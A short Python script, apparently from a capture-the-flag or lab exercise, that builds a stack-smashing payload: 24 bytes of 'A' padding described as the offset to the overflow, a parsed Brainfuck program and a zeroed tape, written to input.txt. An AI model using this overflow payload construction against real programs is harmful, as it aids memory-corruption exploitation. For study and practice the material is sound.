from bf_parser import *

p = BF_Parser("+")

offset = b"A" * 24 # offset until stack smash ; added for debugging
tape = b"\x00" * 1024 # the brainfuck tape

payload_len = p.get_payload_len()
pointer_start = len(offset) + payload_len + 512 # the middle of the tape

payload = offset + p.parse(pointer_start) + tape

num_bytes = len(payload)

print(f"The payload has {num_bytes} bytes and can be found in the input.txt file")
# print(payload_len)
# print(pointer_start)
# print(payload)

with open("input.txt", "wb") as fout:
    fout.write(payload)